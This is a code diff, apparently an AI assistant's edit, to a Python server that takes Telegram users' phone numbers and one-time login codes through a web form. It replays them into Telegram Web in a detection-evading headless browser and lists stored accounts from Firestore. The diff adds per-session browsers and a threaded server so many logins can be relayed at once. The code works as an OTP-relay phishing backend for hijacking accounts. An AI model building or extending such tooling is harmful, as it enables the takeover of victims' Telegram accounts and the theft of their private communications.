@@ -1,3 +1,4 @@
+# ...existing code...
 import undetected_chromedriver as uc
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
@@ -14,6 +15,8 @@ from google.oauth2 import service_account
 from google.cloud import firestore
 from dotenv import load_dotenv
 import os
+import uuid
+from socketserver import ThreadingMixIn
 
 load_dotenv()
 
@@ -23,6 +26,7 @@ login_code = None
 code_received = threading.Event()
 phone_received = threading.Event()
 
+# Firestore initialization (unchanged)
 firestore_db = None
 try:
     fb_key = os.environ.get('FIREBASE_KEY')
@@ -38,12 +42,18 @@ except Exception as e:
     print(f"Failed to initialize Firestore: {e}")
     firestore_db = None
 
+# Session store for concurrent users
+sessions = {}
+sessions_lock = threading.Lock()
+
 class TelegramAutomation:
     def __init__(self):
         self.driver = None
         self.setup_driver()
         self.current_status = "Ready"
+        self.phone_number = None
         
+    # ...existing code...
     def setup_driver(self):
         """Configure and initialize the WebDriver"""
         chrome_options = uc.ChromeOptions()
@@ -66,9 +76,11 @@ class TelegramAutomation:
         except Exception as e:
             print(f"Failed to initialize WebDriver: {e}")
             raise
+    # ...existing code...
     def login_with_phone(self, country_code, phone_number):
         """Perform Telegram login with phone number"""
         try:
+            self.phone_number = f"+{country_code}{phone_number}"
             # Navigate to Telegram Web
             self.driver.get('https://web.telegram.org/a/')
             print("Navigated to Telegram Web")
@@ -191,12 +203,15 @@ class TelegramAutomation:
             print(f"Error during phone login: {e}")
             self.current_status = f"error: {str(e)}"
             # Save error details
-            self.driver.save_screenshot('telegram_error.png')
-            with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
-                f.write(self.driver.page_source)
-            print("Error screenshot and page source saved.")
+            try:
+                self.driver.save_screenshot('telegram_error.png')
+                with open('telegram_error_source.html', 'w', encoding='utf-8') as f:
+                    f.write(self.driver.page_source)
+                print("Error screenshot and page source saved.")
+            except Exception:
+                pass
             return False
-
+    # ...existing code...
     def get_country_name(self, country_code):
         """Get country name from country code"""
         country_map = {
@@ -214,7 +229,7 @@ class TelegramAutomation:
             "82": "South Korea",
         }
         return country_map.get(country_code, "Ethiopia")
-
+    # ...existing code...
     def enter_login_code(self, code):
         """Enter the login code received from user"""
         try:
@@ -263,26 +278,55 @@ class TelegramAutomation:
     def close(self):
         """Close the WebDriver"""
         if self.driver:
-            self.driver.quit()
+            try:
+                self.driver.quit()
+            except Exception:
+                pass
             print("WebDriver closed")
 
-# Global automation instance
+# Global automation instance (deprecated - kept for backwards compatibility if needed)
 automation = None
 
+class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
+    daemon_threads = True
+
 class TelegramHTTPHandler(BaseHTTPRequestHandler):
+    def _set_common_headers(self):
+        self.send_header('Content-type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Session-Id')
+
     def do_GET(self):
         """Handle GET requests"""
-        if self.path == '/status':
-            status = automation.current_status if automation else "not_initialized"
+        parsed = urllib.parse.urlparse(self.path)
+        path = parsed.path
+        query = urllib.parse.parse_qs(parsed.query)
+        session_id = query.get('session', [None])[0] or self.headers.get('X-Session-Id')
+
+        if path == '/status':
+            # If session supplied, return that session's status
+            if session_id:
+                with sessions_lock:
+                    sess = sessions.get(session_id)
+                if not sess:
+                    self.send_response(404)
+                    self._set_common_headers()
+                    self.end_headers()
+                    self.wfile.write(json.dumps({"error": "session_not_found"}).encode())
+                    return
+                status = sess['automation'].current_status
+            else:
+                # fallback to single global automation status for compatibility
+                status = automation.current_status if automation else "not_initialized"
+
             self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.send_header('Access-Control-Allow-Origin', '*')
-            self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-            self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+            self._set_common_headers()
             self.end_headers()
             self.wfile.write(json.dumps({"status": status}).encode())
+            return
         
-        elif self.path == '/':
+        elif path == '/':
             # Serve form.html
             try:
                 with open('form.html', 'rb') as f:
@@ -294,7 +338,7 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             except FileNotFoundError:
                 self.send_error(404, "File not found")
         
-        elif self.path == '/home':
+        elif path == '/home':
             # Serve home.html
             try:
                 with open('home.html', 'rb') as f:
@@ -306,12 +350,11 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
             except FileNotFoundError:
                 self.send_error(404, "File not found")
         
-        elif self.path == '/accounts':
+        elif path == '/accounts':
             # Fetch accounts from Firestore
             if not firestore_db:
                 self.send_response(500)
-                self.send_header('Content-type', 'application/json')
-                self.send_header('Access-Control-Allow-Origin', '*')
+                self._set_common_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"error": "Firestore not initialized"}).encode())
                 return
@@ -328,14 +371,12 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
                     accounts.append(data)
                 
                 self.send_response(200)
-                self.send_header('Content-type', 'application/json')
-                self.send_header('Access-Control-Allow-Origin', '*')
+                self._set_common_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps(accounts).encode())
             except Exception as e:
                 self.send_response(500)
-                self.send_header('Content-type', 'application/json')
-                self.send_header('Access-Control-Allow-Origin', '*')
+                self._set_common_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"error": str(e)}).encode())
         
@@ -350,91 +391,152 @@ class TelegramHTTPHandler(BaseHTTPRequestHandler):
         # Read the POST data
         if content_length > 0:
             post_data = self.rfile.read(content_length)
-            data = json.loads(post_data.decode('utf-8'))
+            try:
+                data = json.loads(post_data.decode('utf-8'))
+            except Exception:
+                data = {}
         else:
             data = {}
         
         self.send_response(200)
-        self.send_header('Content-type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization')
+        self._set_common_headers()
         self.end_headers()
         
         global automation
         
         if self.path == '/phone':
-            if not automation:
-                automation = TelegramAutomation()
-            
             country_code = data.get('country_code', '')
             phone_number = data.get('phone_number', '')
             
             if not country_code or not phone_number:
                 response = {"error": "Missing country_code or phone_number"}
-            else:
-                # store provided phone number on the automation instance for later Firestore saving
-                automation.phone_number = f"+{country_code}{phone_number}"
-                
-                # Run login in a separate thread to avoid blocking
-                def run_login():
-                    automation.login_with_phone(country_code, phone_number)
-                
-                thread = threading.Thread(target=run_login)
-                thread.daemon = True
-                thread.start()
-                
-                response = {"message": "Phone number received, processing login..."}
+                self.wfile.write(json.dumps(response).encode('utf-8'))
+                return
+            # create a session
+            session_id = uuid.uuid4().hex
+            try:
+                new_auto = TelegramAutomation()
+            except Exception as e:
+                response = {"error": f"Failed to start browser: {e}"}
+                self.wfile.write(json.dumps(response).encode('utf-8'))
+                return
+
+            new_auto.phone_number = f"+{country_code}{phone_number}"
+            with sessions_lock:
+                sessions[session_id] = {"automation": new_auto, "created_at": time.time()}
             
+            # Run login in a separate thread to avoid blocking
+            def run_login(auto, cc, pn, sid):
+                try:
+                    auto.login_with_phone(cc, pn)
+                except Exception as e:
+                    auto.current_status = f"error: {e}"
+                # do not auto-close; keep session for code submission and status checks
+
+            thread = threading.Thread(target=run_login, args=(new_auto, country_code, phone_number, session_id))
+            thread.daemon = True
+            thread.start()
+            
+            response = {"message": "Phone number received, processing login...", "session": session_id}
+            self.wfile.write(json.dumps(response).encode('utf-8'))
+            return
+        
         elif self.path == '/code':
-            if not automation:
-                response = {"error": "Automation not initialized. Please enter phone number first."}
-            else:
-                code = data.get('code', '')
-                
-                if not code:
-                    response = {"error": "Missing code"}
-                else:
-                    # Run code entry in a separate thread
-                    def run_code():
-                        automation.enter_login_code(code)
-                    
-                    thread = threading.Thread(target=run_code)
-                    thread.daemon = True
-                    thread.start()
-                    
-                    response = {"message": "Code received, processing..."}
+            session_id = data.get('session') or self.headers.get('X-Session-Id')
+            if not session_id:
+                response = {"error": "Missing session id. Include 'session' in JSON body or 'X-Session-Id' header."}
+                self.wfile.write(json.dumps(response).encode('utf-8'))
+                return
+
+            with sessions_lock:
+                sess = sessions.get(session_id)
+            if not sess:
+                response = {"error": "session_not_found"}
+                self.wfile.write(json.dumps(response).encode('utf-8'))
+                return
+
+            code = data.get('code', '')
+            
+            if not code:
+                response = {"error": "Missing code"}
+                self.wfile.write(json.dumps(response).encode('utf-8'))
+                return
+            auto = sess['automation']
+            # Run code entry in a separate thread
+            def run_code(a, c):
+                try:
+                    a.enter_login_code(c)
+                except Exception as e:
+                    a.current_status = f"error: {e}"
+            thread = threading.Thread(target=run_code, args=(auto, code))
+            thread.daemon = True
+            thread.start()
+            
+            response = {"message": "Code received, processing..."}
+            self.wfile.write(json.dumps(response).encode('utf-8'))
+            return
         
         else:
             response = {"error": "Invalid endpoint"}
-        
-        self.wfile.write(json.dumps(response).encode('utf-8'))
+            self.wfile.write(json.dumps(response).encode('utf-8'))
+            return
     
     def do_OPTIONS(self):
         """Handle CORS preflight requests"""
         self.send_response(200)
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
-        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+        self._set_common_headers()
         self.end_headers()
     
     def log_message(self, format, *args):
         """Override to reduce log noise"""
-        # Uncomment the next line if you want to see all requests
-        # print(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
         pass
+
+def _session_cleaner():
+    """Background cleaner to remove old sessions and close browsers"""
+    while True:
+        with sessions_lock:
+            now = time.time()
+            to_delete = []
+            for sid, val in list(sessions.items()):
+                # remove sessions older than 2 hours or finished with login_success/error older than 10 minutes
+                age = now - val.get('created_at', now)
+                status = val['automation'].current_status
+                if age > 7200:
+                    to_delete.append(sid)
+                elif status in ("login_success",) and age > 600:
+                    to_delete.append(sid)
+                elif status.startswith("error:") and age > 600:
+                    to_delete.append(sid)
+            for sid in to_delete:
+                try:
+                    sessions[sid]['automation'].close()
+                except Exception:
+                    pass
+                sessions.pop(sid, None)
+        time.sleep(300)
 
 def run_server():
     port = int(os.environ.get('PORT', 8765))
-    server = HTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
-    print(f"HTTP server started on 0.0.0.0:{port}")
+    server = ThreadedHTTPServer(('0.0.0.0', port), TelegramHTTPHandler)
+    print(f"HTTP server started on 0.0.0.0:{port} (threaded)")
+    # start session cleaner
+    cleaner = threading.Thread(target=_session_cleaner, daemon=True)
+    cleaner.start()
+    print("Session cleaner thread started")
     print("Press Ctrl+C to stop the server")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
         print("\nShutting down server...")
-        if automation:
-            automation.close()
+        # close all sessions' browsers
+        with sessions_lock:
+            for sid, val in sessions.items():
+                try:
+                    val['automation'].close()
+                except Exception:
+                    pass
+        server.server_close()
 
 if __name__ == "__main__":
     run_server()
+# ...existing code...
